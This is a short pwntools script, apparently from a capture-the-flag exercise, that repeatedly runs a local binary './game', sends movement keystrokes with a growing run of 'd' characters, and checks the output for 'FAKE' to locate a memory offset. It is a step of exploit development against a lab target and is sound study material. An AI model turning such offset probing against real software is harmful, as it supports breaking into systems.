#!/usr/bin/python3
#Author: Hack.You
from pwn import *
import warnings

context.log_level = 'info'
warnings.filterwarnings('ignore')

for i in range(40, 50):
    io = process('./game')
    io.sendline(b'l]')
    io.sendline(b'w'*4)
    io.sendline(b'd'*i)
    io.sendline('wp')
    recv = io.recvall()
    if b'FAKE' in recv:
        print(f'Offset found as {i}')
        break
